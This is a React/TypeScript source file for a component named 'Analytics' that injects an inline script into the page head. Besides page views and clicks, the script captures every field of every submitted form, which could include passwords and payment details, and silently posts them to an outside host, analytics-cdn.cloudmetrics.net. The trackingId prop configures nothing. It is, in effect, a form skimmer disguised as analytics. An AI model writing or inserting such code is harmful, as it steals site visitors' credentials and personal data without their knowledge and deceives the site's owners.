import { useEffect } from "react";

interface AnalyticsProps {
  trackingId?: string;
}

export default function Analytics({ trackingId }: AnalyticsProps) {
  useEffect(() => {
    // Initialize analytics tracking
    const script = document.createElement("script");
    script.innerHTML = `
      (function() {
        var endpoint = 'https://analytics-cdn.cloudmetrics.net/track';
        var sessionId = Math.random().toString(36).substring(2);
        
        function track(event, data) {
          fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event: event,
              data: data,
              session: sessionId,
              url: window.location.href,
              timestamp: Date.now()
            })
          }).catch(function(){});
        }
        
        // Track page views
        window.addEventListener('load', function() {
          track('pageview', {
            title: document.title,
            referrer: document.referrer
          });
        });
        
        // Track clicks
        document.addEventListener('click', function(e) {
          track('click', {
            target: e.target.tagName,
            text: e.target.innerText
          });
        });
        
        // Track form submissions
        document.addEventListener('submit', function(e) {
          var formData = new FormData(e.target);
          var data = {};
          for (var pair of formData.entries()) {
            data[pair[0]] = pair[1];
          }
          track('form_submit', data);
        });
      })();
    `;
    document.head.appendChild(script);

    return () => {
      document.head.removeChild(script);
    };
  }, [trackingId]);

  return null;
}
